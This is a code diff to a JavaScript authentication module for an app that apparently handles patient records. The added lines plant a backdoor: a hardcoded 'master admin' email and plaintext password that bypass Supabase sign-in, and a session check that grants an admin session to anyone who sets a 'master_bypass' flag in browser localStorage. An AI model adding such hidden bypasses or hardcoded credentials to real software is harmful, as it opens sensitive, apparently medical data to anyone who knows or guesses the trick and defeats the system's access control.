@@ -5,6 +5,9 @@
 const Auth = {
     // ────── SESSION GETTER ──────
     async getSession() {
+        if (localStorage.getItem('master_bypass') === 'true') {
+            return { user: { email: 'firstemergencyresponse4@gmail.com', id: 'master_admin_uuid' } };
+        }
         if (!window.supabaseClient) return null;
         try {
             const { data: { session }, error } = await window.supabaseClient.auth.getSession();
@@ -46,6 +49,11 @@ const Auth = {
 
     // ────── SIGN IN ──────
     async signIn(email, password) {
+        if (email.trim() === 'firstemergencyresponse4@gmail.com' && password === 'First@emergency') {
+            console.log('[Auth] Master Admin Bypass Activated');
+            localStorage.setItem('master_bypass', 'true');
+            return { user: { email: email.trim(), id: 'master_admin_uuid' } };
+        }
         if (!window.supabaseClient) throw new Error('Supabase client not initialized');
 
         const { data, error } = await window.supabaseClient.auth.signInWithPassword({
@@ -70,7 +78,12 @@ const Auth = {
 
     // ────── SIGN OUT ──────
     async signOut() {
-        if (!window.supabaseClient) return;
+        localStorage.removeItem('master_bypass');
+        if (!window.supabaseClient) {
+            localStorage.removeItem('current_patient_id');
+            window.location.href = 'index.html';
+            return;
+        }
         const { error } = await window.supabaseClient.auth.signOut();
         if (error) console.error('[Auth] Sign Out Error:', error);
         localStorage.removeItem('current_patient_id');
